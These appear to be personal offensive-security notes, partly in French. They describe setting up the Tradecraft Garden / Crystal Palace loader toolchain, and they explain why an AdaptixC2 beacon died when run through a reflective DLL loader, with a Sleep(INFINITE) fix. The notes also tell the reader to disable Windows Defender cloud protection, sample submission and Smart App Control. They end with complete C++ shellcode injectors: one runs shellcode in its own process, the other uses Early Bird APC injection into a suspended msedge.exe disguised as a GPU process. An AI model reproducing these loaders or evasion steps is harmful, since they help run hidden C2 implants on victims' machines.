https://tradecraftgarden.org/index.html

# Install

## Step 1. WSL

Open an elevated PowerShell (or command) prompt and type:

```
wsl --install -d Debian
```

## Step 2. Java and MinGW-w64


```bash
sudo apt-get update  
sudo apt-get install mingw-w64  
sudo apt-get install make  
sudo apt install default-jdk
sudo apt-get install zip
```

## Step 3. WindowsTerminal

```
winget install Microsoft.WindowsTerminal
```

## Step 4. Update Windows Defender settings

a. Open the Windows Defender settings
b. Disable Cloud protection
c. Disable automatic sample submission
d. Optional: add an exclusion for the folder where your Tradecraft Garden files will live (e.g., c:\tcg)
e. Optional: add an exclusion for the `run.x86.exe` and `run.x64.exe` process names
## Step 5. Disable Smart App Control

a. Open the Windows Security Settings
b. Click App & Browser Control on the left
c. Click Smart App Control Settings
d. Select _Off_ to disable

## Step 6. Install CrytalPalace

```bash
cd /mnt/c/tcg
wget https://tradecraftgarden.org/download/cpdist-latest.tgz
tar zxvf cpdist-latest.tgz
./install

wget https://tradecraftgarden.org/download/tcg-latest.tgz
tar zxvf tcg-latest.tgz
mv tcg tradecraft
```

# Basic usage
https://tradecraftgarden.org/quick.html

Build a tradecraft loader
```
cd /mnt/c/tcg/tradecraft/simple_rdll
make

cd /mnt/c/tcg/tradecraft/libtcg
make
```

Basic example
```
cd /mnt/c/tcg/crystalpalace
cpl link ../tradecraft/simple_rdll/loader.spec demo/test.x64.dll out.x64.bin
./demo/run.x64.exe out.x64.bin
```

---
# Lien avec Shellcode Runner
## Sans Crystal Palace (raw .bin)

Le .bin est du **position-independent shellcode** - c'est littéralement le beacon lui-même, compilé pour s'exécuter n'importe où en mémoire :

```
Thread → [shellcode = beacon loop] → écoute C2, exécute tâches, écoute C2...
                                         ↑
                               ne termine JAMAIS
```

Ton thread ne se termine pas → `WaitForSingleObject` attend indéfiniment → process reste en vie.

## Avec Crystal Palace (RDLL)

Le .bin est un **Reflective DLL Loader** - une petite stub qui fait le travail d'un loader Windows, mais depuis la mémoire :

```
Thread → [reflective loader] → 1. mappe la DLL en mémoire
                               2. résout les imports
                               3. applique les relocations
                               4. appelle DllMain() → spawn nouveau thread (beacon)
                               5. RETOURNE ← ici le thread se termine
                                  
                               [beacon thread] → tourne indépendamment
```

Le thread que **toi** tu as créé avec `CreateThread` se termine rapidement (step 5). Le beacon tourne dans un thread que le loader a spawné lui-même.

## Pourquoi ça crashait

```
CreateThread(loader) → loader termine → hThread signalé
                                              ↓
                                    WaitForSingleObject revient
                                              ↓
                                        main() return
                                              ↓
                                    process exit → tous les threads tués
                                              ↓
                                    beacon mort avant d'avoir parlé au C2
```

Avec `Sleep(INFINITE)`, le process reste en vie peu importe ce que fait le thread initial - le beacon thread survit et fonctionne normalement.

**Avec un .bin brut** (AdaptixC2) : le shellcode **est** la boucle beacon — le thread ne finit jamais, `WaitForSingleObject` attend indéfiniment → process reste en vie.
**Avec Crystal Palace (RDLL)** : le shellcode est un _reflective loader_ — il charge la DLL en mémoire, lance le beacon dans son **propre thread**, puis **retourne**. Donc :
1. Le thread créé par `CreateThread` termine rapidement
2. `WaitForSingleObject(hThread, ...)` revient immédiatement
3. `main()` se termine → process exit → ton beacon meurt avec lui

**Fix** - remplace `WaitForSingleObject` par `Sleep(INFINITE)` pour garder le process en vie indépendamment de ce que fait le shellcode :

**En résumé** : `WaitForSingleObject(hThread)` marche avec un raw shellcode parce que _ce thread_ est le beacon. Avec RDLL, _ce thread_ est juste un intermédiaire - le vrai beacon vit ailleurs.

# Classic injection
```cpp
#include <Windows.h>
#include "shellcode.h"

int main()
{
    unsigned char* shellcode = agent_x64_bin;
    unsigned int shellcode_len = agent_x64_bin_len;

    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,                       // we don't mind where it's allocated
        shellcode_len,          // the size of memory region
        MEM_COMMIT | MEM_RESERVE,   // type of memory allocation
        PAGE_EXECUTE_READWRITE      // memory protection
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),    // handle to target process
        hMemory,                // pointer to target memory region
        shellcode,             // pointer to data to write
        shellcode_len,      // length of data to write
        &bytesWritten           // receives the number of bytes written
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,  // a pointer to the thing to execute
        NULL,
        0,
        &threadId                         // receives the new thread ID
    );

    // wait for the thread to finish
    // Pas avec CrystalPalace
    // WaitForSingleObject(
    //     hThread,    // the handle to wait on
    //     INFINITE    // the length of time to wait
    // );
    
    // close the thread handle
    CloseHandle(hThread);

    // With RDLL shellcode (Crystal Palace), the loader thread exits quickly after
    // spawning the agent in its own thread. Sleep(INFINITE) keeps this process alive
    // regardless of what the shellcode thread does.
    Sleep(INFINITE);
}
```

# Early Bird (APC)

```cpp
#include <Windows.h>
#include "shellcode.h"

int main()
{
    unsigned char* shellcode = agent_x64_bin;
    unsigned int shellcode_len = agent_x64_bin_len;

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcessW(
        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        (LPWSTR)L"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=gpu-process",
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );


    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        pi.hProcess,    // handle to newly spawned process
        NULL,
        shellcode_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        hMemory,
        shellcode,
        shellcode_len,
        &bytesWritten
    );

    // queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,
        pi.hThread,
        0
    );

    // resume the process
    ResumeThread(pi.hThread);

    // tidy up our handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```